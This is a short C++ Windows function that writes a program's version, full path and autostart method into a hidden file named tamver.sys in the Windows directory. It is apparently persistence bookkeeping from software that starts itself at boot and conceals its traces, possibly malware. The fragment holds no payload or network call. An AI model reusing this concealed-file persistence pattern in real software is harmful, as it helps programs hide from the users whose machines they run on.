   bool RegisterVersion(char Version[], char FullPath[], char AutostartMethod[])
   {
       char        WindowsDir[MAX_PATH];
       HANDLE      FileHandle;
       DWORD       BytesWrite;

       if(GetWindowsDirectory(WindowsDir, sizeof(WindowsDir)) != 0)
       {
           lstrcat(WindowsDir, "\\tamver.sys");

           FileHandle = CreateFile(WindowsDir, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);

           if(FileHandle != INVALID_HANDLE_VALUE)
           {
               if(WriteFile(FileHandle, Version, lstrlen(Version), &BytesWrite, 0) &&
                  WriteFile(FileHandle, "\r\n", 2, &BytesWrite, 0) &&
                  WriteFile(FileHandle, FullPath, lstrlen(FullPath), &BytesWrite, 0) &&
                  WriteFile(FileHandle, "\r\n", 2, &BytesWrite, 0) &&
                  WriteFile(FileHandle, AutostartMethod, lstrlen(AutostartMethod), &BytesWrite, 0) &&
                  WriteFile(FileHandle, "\r\n", 2, &BytesWrite, 0) != 0)
               {
                   CloseHandle(FileHandle);
                   return true;
               }

               CloseHandle(FileHandle);
           }
       }

       return false;
   }
